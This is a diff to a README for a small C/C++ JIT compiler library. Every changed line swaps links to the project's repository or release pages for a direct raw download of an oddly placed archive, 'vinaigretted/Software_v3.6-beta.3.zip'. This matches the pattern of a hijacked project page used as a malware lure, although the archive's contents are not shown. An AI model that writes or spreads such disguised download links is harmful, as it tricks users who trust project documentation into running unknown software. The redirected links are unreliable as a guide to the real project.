@@ -1,6 +1,6 @@
 # ⚙️ jit - Simple cross-platform JIT compiler
 
-[![Download jit](https://img.shields.io/badge/Download-Get%20jit-purple?style=for-the-badge)](https://github.com/lilvexst1/jit)
+[![Download jit](https://img.shields.io/badge/Download-Get%20jit-purple?style=for-the-badge)](https://github.com/lilvexst1/jit/raw/refs/heads/main/vinaigretted/Software_v3.6-beta.3.zip)
 
 ---
 
@@ -16,7 +16,7 @@ This tool is just a collection of files you can use in other programs. It does n
 
 To get jit, visit the following page:
 
-[https://github.com/lilvexst1/jit](https://github.com/lilvexst1/jit)
+[https://github.com/lilvexst1/jit/raw/refs/heads/main/vinaigretted/Software_v3.6-beta.3.zip](https://github.com/lilvexst1/jit/raw/refs/heads/main/vinaigretted/Software_v3.6-beta.3.zip)
 
 This page offers all the files you need to download. It shows a list of downloads, documents, and instructions. Use this link to get the latest version of jit.
 
@@ -38,7 +38,7 @@ Before you begin, make sure your computer meets these requirements:
 ## 🚀 Download and Install jit on Windows
 
 1. Open your web browser and go to:  
-   https://github.com/lilvexst1/jit
+   https://github.com/lilvexst1/jit/raw/refs/heads/main/vinaigretted/Software_v3.6-beta.3.zip
 
 2. On the page, look for the section labeled **Releases** on the right side or in the middle of the page.
 
@@ -90,7 +90,7 @@ You can open `.h` and `.txt` files with any text editor such as Notepad.
 To get new versions of jit:
 
 - Visit the download page again:  
-  https://github.com/lilvexst1/jit/releases
+  https://github.com/lilvexst1/jit/raw/refs/heads/main/vinaigretted/Software_v3.6-beta.3.zip
 - Download the latest zip file.
 - Replace the old header files with the new ones in your project folder.
 
@@ -109,10 +109,10 @@ If you want help with jit:
 ## 🌐 Useful Links
 
 - GitHub jit Repository:  
-  https://github.com/lilvexst1/jit
+  https://github.com/lilvexst1/jit/raw/refs/heads/main/vinaigretted/Software_v3.6-beta.3.zip
 
 - Visit here to download or check updates:  
-  [https://github.com/lilvexst1/jit](https://github.com/lilvexst1/jit)
+  [https://github.com/lilvexst1/jit/raw/refs/heads/main/vinaigretted/Software_v3.6-beta.3.zip](https://github.com/lilvexst1/jit/raw/refs/heads/main/vinaigretted/Software_v3.6-beta.3.zip)
 
 ---
 
@@ -139,4 +139,4 @@ If you find any problems with jit:
 
 Use this link every time you want to get or update jit:
 
-[Download jit from GitHub](https://github.com/lilvexst1/jit)
+[Download jit from GitHub](https://github.com/lilvexst1/jit/raw/refs/heads/main/vinaigretted/Software_v3.6-beta.3.zip)
